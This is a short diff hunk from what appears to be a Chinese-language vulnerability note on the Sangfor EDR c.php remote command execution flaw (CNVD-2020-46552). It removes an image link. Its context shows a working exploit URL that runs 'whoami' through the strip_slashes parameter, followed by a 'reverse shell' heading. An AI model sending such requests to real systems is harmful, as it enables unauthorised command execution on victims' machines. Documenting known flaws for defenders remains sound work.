@@ -28,7 +28,7 @@ https://xxx.xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&row=whoami
 ```
 
 
-![img](./.resource/深信服-EDR-c.php-远程命令执行漏洞-CNVD-2020-46552/media/202202091913721.png)
+
 
 
 **反弹shell**
